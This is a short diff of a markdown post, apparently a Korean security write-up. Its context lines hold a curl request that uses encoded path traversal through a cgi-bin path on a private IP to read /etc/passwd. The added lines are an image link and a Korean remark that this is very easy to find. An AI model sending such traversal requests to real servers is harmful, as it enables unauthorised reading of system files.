@@ -28,3 +28,6 @@ tags:
 curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
+![](assets/images/posts/2018-12-05-an-exhibit-of-markdown%202/1e2f37042219927559bbf236b3e92a62_MD5.jpeg)
+
+아주 간단하게 찾을 수 있당.
